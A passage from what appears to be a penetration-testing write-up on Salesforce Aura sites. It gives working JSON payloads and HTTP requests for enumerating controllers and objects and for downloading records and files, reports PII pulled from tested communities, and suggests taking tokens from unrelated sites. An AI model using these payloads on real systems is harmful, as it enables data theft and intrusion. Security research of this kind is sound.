+  <p>Use the following regex alongside some tool integrated with grep (eg. Response Grepper <sup id="fnref:resp-grep"><a href="#fn:resp-grep" class="footnote" rel="footnote" role="doc-noteref">11</a></sup>) in order to quickly extract custom apex class descriptors:<br /><br />
+Regex: <code class="language-plaintext highlighter-rouge">"descriptor":"(apex:\/\/[^\"]*)</code><br /><br />
+<a href="/assets/img/Salesforce-PT/Salesforce-response-grepper.png" class="popup img-link shimmer"><img src="/assets/img/Salesforce-PT/Salesforce-response-grepper.png" alt="" loading="lazy"></a></p>
+</blockquote>
+
+<p>Sometimes, however, searching for <code class="language-plaintext highlighter-rouge">compound://</code> in server responses does not reveal any custom <code class="language-plaintext highlighter-rouge">apex</code> controller (because maybe it was cached by the browser in the past, or for any other reason).</p>
+
+<p>In these cases, we must use different approaches:</p>
+<ol>
+  <li>we can search with a top-down approach for every custom component starting from static resources <sup id="fnref:appomni"><a href="#fn:appomni" class="footnote" rel="footnote" role="doc-noteref">12</a></sup></li>
+  <li>we can <strong>identify any HTTP request that sends a <code class="language-plaintext highlighter-rouge">message</code> field containing an <code class="language-plaintext highlighter-rouge">apex</code> controller</strong> and extract some important values that will be used later to query the <code class="language-plaintext highlighter-rouge">/auraCmpDef</code> endpoint and obtain any custom controller linked to the original <code class="language-plaintext highlighter-rouge">apex</code> class.</li>
+</ol>
+
+<p>Below is an example of a request for a message using an apex controller, and the required parameters to be extracted:</p>
+<div class="language-http highlighter-rouge"><div class="code-header">
+        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/foo/s/sfsites/aura?r=2&amp;other.CommunityUtil.getCurrentCommunityContextInfos=1</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">2</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">[...REDACTED...]</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">[...TRUNCATED...]</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">760</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36</span>
+<span class="na">X-Sfdc-Page-Scope-Id</span><span class="p">:</span> <span class="s">91062b0d-10f8-402b-a496-5ece7b62f20a</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded; charset=UTF-8</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">[...REDACTED...]</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">[...REDACTED...]</span>
+<span class="na">Priority</span><span class="p">:</span> <span class="s">u=1, i</span>
+
+message=%7B%22actions%22%3A%5B%7B%22id%22%3A%2246%3Ba%22%2C%22descriptor%22%3A%22apex%3A%2F%2FCommunityUtil%2FACTION%24getCurrentCommunityContextInfos%22%2C%22callingDescriptor%22%3A%22markup%3A%2F%2Fc%3ACA_CommunityUtil%22%2C%22params%22%3A%7B%7D%7D%5D%7D
+&amp;aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22ZzhjQmRxMXdrdzhvS0RJMG5qQVdxQTdEcXI0cnRHWU0zd2xrUnFaakQxNXc5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AloginApp2%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AloginApp2%22%3A%221098_0Gzb_TJPQxPxmu8ktwr7uw%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D
+&amp;aura.pageURI=[...TRUNCATED...]&amp;aura.token=null
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>From the relative <code class="language-plaintext highlighter-rouge">context</code> field, we have to extract:</p>
+<ul>
+  <li>the <code class="language-plaintext highlighter-rouge">loaded</code> content and the relative ID</li>
+  <li>the desired <code class="language-plaintext highlighter-rouge">descriptor</code></li>
+</ul>
+
+<p>From the <code class="language-plaintext highlighter-rouge">message</code> field, we have to identify the custom <code class="language-plaintext highlighter-rouge">callingDescriptor</code>.</p>
+
+<p><a href="/assets/img/Salesforce-PT/Salesforce-message-parameters.png" class="popup img-link shimmer"><img src="/assets/img/Salesforce-PT/Salesforce-message-parameters.png" alt="" loading="lazy"></a></p>
+
+<p>Once obtained these three information, we can query the <code class="language-plaintext highlighter-rouge">/auraCmpDef</code> endpoint and extract <strong>every</strong> declared apex controller for the specified descriptor:</p>
+
+<div class="language-http highlighter-rouge"><div class="code-header">
+        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/example/auraCmpDef?aura.app=&lt;APP_MARKUP&gt;&amp;_au=&lt;AU_VALUE&gt;&amp;_def=&lt;COMPONENT_MARKUP&gt;&amp;_ff=DESKTOP&amp;_l=true&amp;_cssvar=false&amp;_c=false&amp;_l10n=en_US&amp;_style=-1450740311&amp;_density=VIEW_ONE</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">redacted.my.site.com</span>
+</pre></td></tr></tbody></table></code></div></div>
+<p>Example: <a href="https://redacted.my.site.com/example/auraCmpDef?aura.app=markup://siteforce:loginApp2&amp;_au=1098_0Gzb_TJPQxPxmu8ktwr7uw&amp;_def=markup://c:CA_CommunityUtil&amp;_c=false&amp;_density=VIEW_ONE&amp;_dfs=8&amp;_ff=DESKTOP&amp;_l=true&amp;_l10n=en_US&amp;_lrmc=-386269907&amp;_style=-1450740311&amp;_uid=329__98ODtCT_xKhlVwqtRYokg&amp;aura.mode=PROD">https://redacted.my.site.com/example/auraCmpDef?aura.app=markup://siteforce:loginApp2&amp;_au=1098_0Gzb_TJPQxPxmu8ktwr7uw&amp;_def=markup://c:CA_CommunityUtil&amp;_c=false&amp;_density=VIEW_ONE&amp;_dfs=8&amp;_ff=DESKTOP&amp;_l=true&amp;_l10n=en_US&amp;_lrmc=-386269907&amp;_style=-1450740311&amp;_uid=329__98ODtCT_xKhlVwqtRYokg&amp;aura.mode=PROD
+</a></p>
+
+<p><a href="/assets/img/Salesforce-PT/salesforce-auracmpdef.png" class="popup img-link shimmer"><img src="/assets/img/Salesforce-PT/salesforce-auracmpdef.png" alt="" loading="lazy"></a></p>
+
+<p>Now that we know <em>exactly</em> the definition of the controller, we can craft an ad-hoc <code class="language-plaintext highlighter-rouge">message</code> to the community’s aura endpoint to attempt to interact with the method:</p>
+
+<div class="language-http highlighter-rouge"><div class="code-header">
+        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/custom-community/s/sfsites/aura</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">2</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">[...REDACTED...]</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">[...TRUNCATED...]</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">816</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded; charset=UTF-8</span>
+
+message={"actions":[{"id":"150;a","descriptor":"apex://CommunityUtil/ACTION$getCurrentCommunityContextInfos","callingDescriptor":"markup://c:CA_CommunityUtil","params":{}}]}
+&amp;aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22ZzhjQmRxMXdrdzhvS0RJMG5qQVdxQTdEcXI0cnRHWU0zd2xrUnFaakQxNXc5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221176_RiEqto7a10RL4-qsAx8xFg%22%2C%22MODULE%40markup%3A%2F%2Flightning%3Af6Controller%22%3A%22292_Kx4YnuF8cbgQbawpLBy0SQ%22%2C%22COMPONENT%40markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader%22%3A%22335_G1NlWPtUoLRA_nLC-0oFqg%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D
+&amp;aura.pageURI=[...REDACTED...]
+&amp;aura.token=null
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>A more detailed list of descriptors and <em>undocumented</em> endpoints can be found at the following links:</p>
+<ul>
+  <li><a href="https://developer.salesforce.com/docs/platform/lwc/guide/reference-ui-api.html">lightning/ui*Api Wire Adapters and Functions</a>, developer.salesforce.com</li>
+  <li><a href="https://www.varonis.com/blog/abusing-salesforce-communities#:~:text=Aura%20descriptors%20and%20how%20to%20use%20them">Aura descriptors and how to use them</a> (written by Nitay Bachrach, varonis.com)</li>
+</ul>
+
+<h3 id="identify-standard-and-custom-objects"><span class="me-2">Identify Standard and Custom Objects</span><a href="#identify-standard-and-custom-objects" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>Going back to what was said in the introduction, in Salesforce there are two types of objects: standard and custom. Both of them can be misconfigured and made accessible to unauthorized users.</p>
+
+<p>From an attacker’s point of view, it is important to <strong>identify as many misconfigured Objects as possible</strong> as they may contain sensitive information, both for the exploitation phase and for the nature of the data itself.</p>
+
+<p>The following is a list of controllers and actions that can be used to enumerate objects and look for permission issues or information leaks (insert them within the <code class="language-plaintext highlighter-rouge">message</code> field and send them to <code class="language-plaintext highlighter-rouge">/aura</code>):</p>
+
+<ul>
+  <li><strong>getConfigData</strong>: List all the configuration and objects within the <code class="language-plaintext highlighter-rouge">apiNamesToKeyPrefixes</code> key for the current Salesforce application. Search within the response for Custom Objects suffixed with <code class="language-plaintext highlighter-rouge">__c</code> and copy them to a custom wordlist.
+    <div class="language-json highlighter-rouge"><div class="code-header">
+        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"actions"</span><span class="p">:[{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"1;a"</span><span class="p">,</span><span class="nl">"descriptor"</span><span class="p">:</span><span class="s2">"aura://HostConfigController/ACTION$getConfigData"</span><span class="p">,</span><span class="nl">"callingDescriptor"</span><span class="p">:</span><span class="s2">"UNKNOWN"</span><span class="p">,</span><span class="nl">"params"</span><span class="p">:{}}]}</span><span class="w">
+</span></pre></td></tr></tbody></table></code></div>    </div>
+    <p><a href="/assets/img/Salesforce-PT/salesforce-getConfigData.png" class="popup img-link shimmer"><img src="/assets/img/Salesforce-PT/salesforce-getConfigData.png" alt="" loading="lazy"></a></p>
+  </li>
+  <li><strong>getObjectInfo</strong> <sup id="fnref:getobjectinfo"><a href="#fn:getobjectinfo" class="footnote" rel="footnote" role="doc-noteref">13</a></sup>: Get metadata about a specific object. You can use this action to understand if the user has access to the object or not. It will not return any informative response if the user does not have access, otherwise, this will return information about an object and its corresponding fields. Watch out for <code class="language-plaintext highlighter-rouge">__c</code> in the response from each object to make notes about the related custom objects and fields.
+    <div class="language-json highlighter-rouge"><div class="code-header">
+        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"actions"</span><span class="p">:[{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"1;a"</span><span class="p">,</span><span class="nl">"descriptor"</span><span class="p">:</span><span class="s2">"aura://RecordUiController/ACTION$getObjectInfo"</span><span class="p">,</span><span class="nl">"callingDescriptor"</span><span class="p">:</span><span class="s2">"UNKNOWN"</span><span class="p">,</span><span class="nl">"params"</span><span class="p">:{</span><span class="nl">"objectApiName"</span><span class="p">:</span><span class="s2">"§FUZZ-EVERY-OBJECT-HERE§"</span><span class="p">}}]}</span><span class="w">
+</span></pre></td></tr></tbody></table></code></div>    </div>
+    <p><a href="/assets/img/Salesforce-PT/salesforce-getObjectInfo.png" class="popup img-link shimmer"><img src="/assets/img/Salesforce-PT/salesforce-getObjectInfo.png" alt="" loading="lazy"></a></p>
+  </li>
+</ul>
+
+<ul>
+  <li><strong>getListByObjectName</strong>: returns the lists created for an object in the UI. Watch out for <code class="language-plaintext highlighter-rouge">__c</code> in the response from each object to make note about the related custom objects and fields.
+    <div class="language-json highlighter-rouge"><div class="code-header">
+        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"actions"</span><span class="p">:[{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"1;a"</span><span class="p">,</span><span class="nl">"descriptor"</span><span class="p">:</span><span class="s2">"aura://ListUiController/ACTION$getListsByObjectName"</span><span class="p">,</span><span class="nl">"callingDescriptor"</span><span class="p">:</span><span class="s2">"UNKNOWN"</span><span class="p">,</span><span class="nl">"params"</span><span class="p">:{</span><span class="nl">"objectApiName"</span><span class="p">:</span><span class="s2">"§FUZZ-EVERY-OBJECT-HERE§"</span><span class="p">}}]}</span><span class="w">
+</span></pre></td></tr></tbody></table></code></div>    </div>
+  </li>
+</ul>
+
+<p>At this point, after having merged the standard objects <sup id="fnref:std-objects:1"><a href="#fn:std-objects" class="footnote" rel="footnote" role="doc-noteref">4</a></sup> and the custom objects obtained with the actions above, <strong>we are ready</strong> to check which ones are accessible and what information they contain.</p>
+
+<p>Let’s start digging!</p>
+
+<h2 id="fuzzing-and-exploitation"><span class="me-2">Fuzzing and Exploitation</span><a href="#fuzzing-and-exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>Once we have mapped out most of the attack surface and obtained valid <code class="language-plaintext highlighter-rouge">aura.token</code> and <code class="language-plaintext highlighter-rouge">aura.context</code> values (<em>go grab them from any Salesforce exposed with the guest user active if your target doesn’t provide them!</em>), we can start extracting data and interacting with the identified classes.</p>
+
+<h3 id="object-permission-issues"><span class="me-2">Object permission issues</span><a href="#object-permission-issues" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>If admins messed up the sharing permissions on the various objects and fields, we can use some standard controllers to access the broken records.</p>
+
+<ul>
+  <li><strong>getItems</strong>: retrieves records for a given object bounded to specific user permissions, but if record permissions are misconfigured, this can retrieve records of an entire object.
+    <div class="language-json highlighter-rouge"><div class="code-header">
+        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"actions"</span><span class="p">:[{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"123;a"</span><span class="p">,</span><span class="nl">"descriptor"</span><span class="p">:</span><span class="s2">"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems"</span><span class="p">,</span><span class="nl">"callingDescriptor"</span><span class="p">:</span><span class="s2">"UNKNOWN"</span><span class="p">,</span><span class="nl">"params"</span><span class="p">:{</span><span class="nl">"entityNameOrId"</span><span class="p">:</span><span class="s2">"§FUZZ-EVERY-STANDARD-OBJECT§"</span><span class="p">,</span><span class="nl">"layoutType"</span><span class="p">:</span><span class="s2">"FULL"</span><span class="p">,</span><span class="nl">"pageSize"</span><span class="p">:</span><span class="mi">100</span><span class="p">,</span><span class="nl">"currentPage"</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="nl">"useTimeout"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nl">"getCount"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nl">"enableRowActions"</span><span class="p">:</span><span class="kc">false</span><span class="p">}}]}</span><span class="w">
+</span></pre></td></tr></tbody></table></code></div>    </div>
+  </li>
+  <li><strong>getRecord</strong> <sup id="fnref:get-record"><a href="#fn:get-record" class="footnote" rel="footnote" role="doc-noteref">14</a></sup>: retrieves records starting from on a record id.
+    <div class="language-json highlighter-rouge"><div class="code-header">
+        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"actions"</span><span class="p">:[{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"123;a"</span><span class="p">,</span><span class="nl">"descriptor"</span><span class="p">:</span><span class="s2">"serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord"</span><span class="p">,</span><span class="nl">"callingDescriptor"</span><span class="p">:</span><span class="s2">"UNKNOWN"</span><span class="p">,</span><span class="nl">"params"</span><span class="p">:{</span><span class="nl">"recordId"</span><span class="p">:</span><span class="s2">"§RECORD-ID§"</span><span class="p">,</span><span class="nl">"record"</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nl">"inContextOfComponent"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="nl">"mode"</span><span class="p">:</span><span class="s2">"VIEW"</span><span class="p">,</span><span class="nl">"layoutType"</span><span class="p">:</span><span class="s2">"FULL"</span><span class="p">,</span><span class="nl">"defaultFieldValues"</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nl">"navigationLocation"</span><span class="p">:</span><span class="s2">"LIST_VIEW_ROW"</span><span class="p">}}]}</span><span class="w">
+</span></pre></td></tr></tbody></table></code></div>    </div>
+  </li>
+</ul>
+
+<blockquote class="info">
+  <p>IDs generally look like this: <code class="language-plaintext highlighter-rouge">"Id":"0099g000001mWQaYHU"</code></p>
+</blockquote>
+
+<p>Using these controllers, I started to extract every misconfigured object from the various communities, obtaining different interesting information, including:</p>
+<ul>
+  <li>customers names, surnames, emails, phone numbers, and other PII from several <strong>Contact objects</strong></li>
+  <li>names, surnames, emails and IDs (very useful for the exploitation phase) from several <strong>Account objects</strong></li>
+  <li>Other PII from different <strong>AccountTeamMember</strong> and <strong>AccountContactRelation objects</strong></li>
+  <li>Personal notes from some <strong>Note objects</strong></li>
+  <li>Exposed files from several <strong>Document</strong>, <strong>ContentDocument</strong> and <strong>ContentVersion objects</strong></li>
+  <li>Calendar events from <strong>Calendar objects</strong></li>
+  <li>and other information from some other standard and custom objects, like <strong>Knowledge__kav</strong>, <strong>KnowledgeArticleVersion</strong>, <strong>ProcessInstanceWorkitem</strong>, <strong>CollaborationGroup</strong> and many others</li>
+</ul>
+
+<p><a href="/assets/img/Salesforce-PT/salesforce-user-obj.png" class="popup img-link shimmer"><img src="/assets/img/Salesforce-PT/salesforce-user-obj.png" alt="" loading="lazy"></a>
+<em>sample data exposed by a User object</em></p>
+
+<p><a href="/assets/img/Salesforce-PT/salesforce-user-ids.png" class="popup img-link shimmer"><img src="/assets/img/Salesforce-PT/salesforce-user-ids.png" alt="" loading="lazy"></a>
+<em>list of User IDs</em></p>
+
+<p><a href="/assets/img/Salesforce-PT/salesforce-quotations.png" class="popup img-link shimmer"><img src="/assets/img/Salesforce-PT/salesforce-quotations.png" alt="" loading="lazy"></a>
+<em>estimated quotations for customer orders</em></p>
+
+<p><a href="/assets/img/Salesforce-PT/salesforce-contact-info.png" class="popup img-link shimmer"><img src="/assets/img/Salesforce-PT/salesforce-contact-info.png" alt="" loading="lazy"></a>
+<em>personal user information</em></p>
+
+<p>Among the various objects, some of them will return IDs particularly related to <strong>attachments</strong>. You can use those IDs with some specific API to <strong>retrieve and download the raw files</strong> (these paths are relative to the base path, not the aura endpoint):</p>
+
+<ul>
+  <li>Document - Prefix 015 - <code class="language-plaintext highlighter-rouge">/servlet/servlet.FileDownload?file=ID</code></li>
+  <li>ContentDocument - Prefix 069 - <code class="language-plaintext highlighter-rouge">/sfc/servlet.shepherd/document/download/ID</code></li>
+  <li>ContentVersion - Prefix 068 - <code class="language-plaintext highlighter-rouge">/sfc/servlet.shepherd/version/download/ID</code></li>
+</ul>
+
+<p>See <a href="https://www.biswajeetsamal.com/blog/salesforce-object-key-prefix-list/">Salesforce Object Key Prefix List</a> (written by biswajeetsamal, biswajeetsamal.com)  for a full default object ID prefixes list.</p>
+
+<div class="language-json highlighter-rouge"><div class="code-header">
+        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="err">//</span><span class="w"> </span><span class="err">sample</span><span class="w"> </span><span class="err">input</span><span class="w">
+</span><span class="p">{</span><span class="nl">"actions"</span><span class="p">:[{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"123;a"</span><span class="p">,</span><span class="nl">"descriptor"</span><span class="p">:</span><span class="s2">"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems"</span><span class="p">,</span><span class="nl">"callingDescriptor"</span><span class="p">:</span><span class="s2">"UNKNOWN"</span><span class="p">,</span><span class="nl">"params"</span><span class="p">:{</span><span class="nl">"entityNameOrId"</span><span class="p">:</span><span class="s2">"ContentVersion"</span><span class="p">,</span><span class="nl">"layoutType"</span><span class="p">:</span><span class="s2">"FULL"</span><span class="p">,</span><span class="nl">"pageSize"</span><span class="p">:</span><span class="mi">100</span><span class="p">,</span><span class="nl">"currentPage"</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="nl">"useTimeout"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nl">"getCount"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nl">"enableRowActions"</span><span class="p">:</span><span class="kc">false</span><span class="p">}}]}</span><span class="w">
+
+</span><span class="err">//</span><span class="w"> </span><span class="err">sample</span><span class="w"> </span><span class="err">output</span><span class="w">
+</span><span class="p">{</span><span class="nl">"record"</span><span class="p">:{</span><span class="nl">"LastModifiedDate"</span><span class="p">:</span><span class="s2">"2023-09-01T13:13:22.000Z"</span><span class="p">,</span><span class="nl">"Description"</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nl">"CreatedDate"</span><span class="p">:</span><span class="s2">"2023-09-01T13:13:20.000Z"</span><span class="p">,</span><span class="nl">"Title"</span><span class="p">:</span><span class="s2">"NPAZ_599283a16ca1463fa0523e4088b4602 (1)"</span><span class="p">,</span><span class="nl">"CurrencyIsoCode__l"</span><span class="p">:</span><span class="s2">"EUR - Euro"</span><span class="p">,</span><span class="nl">"Id"</span><span class="p">:</span><span class="s2">"068690000164AzJAAU"</span><span class="p">,</span><span class="nl">"CurrencyIsoCode"</span><span class="p">:</span><span class="s2">"EUR"</span><span class="p">,</span><span class="nl">"LastModifiedById"</span><span class="p">:</span><span class="s2">"0056900000BlCU8AAN"</span><span class="p">,</span><span class="nl">"SystemModstamp"</span><span class="p">:</span><span class="s2">"2024-03-22T11:21:11.000Z"</span><span class="p">,</span><span class="nl">"sobjectType"</span><span class="p">:</span><span class="s2">"ContentVersion"</span><span class="p">}}</span><span class="w">
+</span></pre></td></tr></tbody></table></code></div></div>
+
+<div class="language-http highlighter-rouge"><div class="code-header">
+        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/sfc/servlet.shepherd/version/download/068690000164AzJAAU</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">2</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">redacted.com</span>
+
+--- RESPONSE ---
+
+HTTP/2 200 OK
+Date: Wed, 03 Jul 2024 20:04:52 GMT
+Content-Type: image/jpeg; charset=UTF-8
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Doing this way, I was able to access and download some files conceptually conceived as <em>restricted</em> relative to deployment configurations, private screenshots, sales tables, and others.</p>
+
+<p><a href="/assets/img/Salesforce-PT/salesforce-exposed-file.png" class="popup img-link shimmer"><img src="/assets/img/Salesforce-PT/salesforce-exposed-file.png" alt="" loading="lazy"></a>
+<a href="/assets/img/Salesforce-PT/salesforce-exposed-file2.png" class="popup img-link shimmer"><img src="/assets/img/Salesforce-PT/salesforce-exposed-file2.png" alt="" loading="lazy"></a>
+<em>sample files exposed by a ContentDocument object</em></p>
+
+<h3 id="broken-access-control-on-custom-classes"><span class="me-2">Broken Access Control on Custom Classes</span><a href="#broken-access-control-on-custom-classes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>While enumerating the communities that had been assigned to me, I stumbled upon a couple of communities that particularly caught my attention. They had the Guest User enabled, and I was able to query a lot of interesting information including user-related ones (<em>see the previous section</em>), but most importantly, they automatically contacted a couple of <strong>custom controllers</strong> to read out some <strong>routes</strong>.</p>
+
+<p><a href="/assets/img/Salesforce-PT/salesforce-routes.png" class="popup img-link shimmer"><img src="/assets/img/Salesforce-PT/salesforce-routes.png" alt="" loading="lazy"></a></p>
+
+<p>Visiting these routes, the sites started to make many more requests to the aura endpoint to download <strong>every</strong> relevant controller matched to the route, exposing many custom controllers and custom methods.</p>
+
+<p><a href="/assets/img/Salesforce-PT/salesforce-apex1.png" class="popup img-link shimmer"><img src="/assets/img/Salesforce-PT/salesforce-apex1.png" alt="" loading="lazy"></a>
+<a href="/assets/img/Salesforce-PT/salesforce-apex2.png" class="popup img-link shimmer"><img src="/assets/img/Salesforce-PT/salesforce-apex2.png" alt="" loading="lazy"></a></p>
+
+<p>Has something already caught your attention?</p>
+
+<p>Out of all the various controllers, one in particular was very interesting to me: <code class="language-plaintext highlighter-rouge">CA_ChangePasswordSettingController</code>, and in particular the action <code class="language-plaintext highlighter-rouge">resetPassword</code>:</p>
+
+<p><a href="/assets/img/Salesforce-PT/salesforce-changepasswordsettingcontroller.png" class="popup img-link shimmer"><img src="/assets/img/Salesforce-PT/salesforce-changepasswordsettingcontroller.png" alt="" loading="lazy"></a></p>
+
+<div class="language-json highlighter-rouge"><div class="code-header">
+        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre></td><td class="rouge-code"><pre><span class="nl">"cd"</span><span class="p">:{</span><span class="w">
+  </span><span class="nl">"descriptor"</span><span class="p">:</span><span class="w"> </span><span class="s2">"compound://c.CA_ResetPasswordSetting"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"ac"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+    </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"n"</span><span class="p">:</span><span class="w"> </span><span class="s2">"resetPassword"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"descriptor"</span><span class="p">:</span><span class="w"> </span><span class="s2">"apex://CA_ChangePasswordSettingController/ACTION$resetPassword"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"at"</span><span class="p">:</span><span class="w"> </span><span class="s2">"SERVER"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"rt"</span><span class="p">:</span><span class="w"> </span><span class="s2">"apex://String"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"pa"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+          </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"userID"</span><span class="p">,</span><span class="w">
+          </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"apex://String"</span><span class="w">
+        </span><span class="p">},</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+          </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"newPassword"</span><span class="p">,</span><span class="w">
